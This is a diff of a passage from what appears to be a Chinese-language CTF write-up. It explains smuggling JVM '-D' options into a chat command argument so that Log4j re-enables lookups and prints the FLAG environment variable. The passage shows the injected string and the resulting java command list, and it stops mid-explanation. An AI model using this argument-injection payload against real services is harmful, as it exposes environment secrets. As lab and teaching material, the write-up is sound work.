@@ -217,9 +217,24 @@ def chat(cmd, text):
 所以这里我们就可以去注入参数了
 比如我们构造
 ```bash
--Dcmd=/weather-Dlog4j2.formatMsgNoLookups=false-Dlog4j2.layout.pattern=${env:FLAG}
+'-Dcmd = /weather-Dlog4j2.formatMsgNoLookups=false-Dlog4j2.layout.pattern=${env:FLAG}'
 #此时jvm解析后就是
--Dcmd=/weather
--Dlog4j2.formatMsgNoLookups=false
--Dlog4j2.layout.pattern=${env:FLAG}
+java_command = [
+    'java',
+    '-Xms48M',
+    '-Xmx96M',
+    '-Dcmd=/weather',
+    '-Dlog4j2.formatMsgNoLookups=false',
+    '-Dlog4j2.layout.pattern=${env:FLAG}',
+    '-jar',
+    JAVA_JAR_PATH,
+    text
+]
+
 ```
+后面的就被当作参数注入了
+然后解释一下这两个参数
+* `-Dlog4j2.formatMsgNoLookups=false
+* `-Dlog4j2.layout.pattern=${env:FLAG}
+首先`-D`开头的是`JVM系统参数
+然后这两条都是属于`jog4`
